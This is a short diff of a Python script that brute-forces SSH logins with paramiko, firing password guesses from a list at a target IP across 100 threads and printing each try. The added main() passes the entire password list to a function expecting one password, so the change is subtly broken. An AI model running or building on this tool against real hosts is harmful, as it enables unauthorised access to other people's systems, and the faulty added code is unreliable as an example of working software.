@@ -1,7 +1,6 @@
 import paramiko
 from concurrent.futures import ThreadPoolExecutor
 
-
 def attempt(ip, pwd):
     policy = paramiko.client.AutoAddPolicy
     with paramiko.SSHClient() as client:
@@ -24,3 +23,9 @@ with ThreadPoolExecutor(max_workers=100) as ex:
     for pwd in passwords:
         print(f"Trying password: {pwd.strip()}")
         ex.submit(attempt, ip, pwd)
+
+def main():
+    attempt(ip, passwords)
+
+if __name__ == "__main__":
+    main()
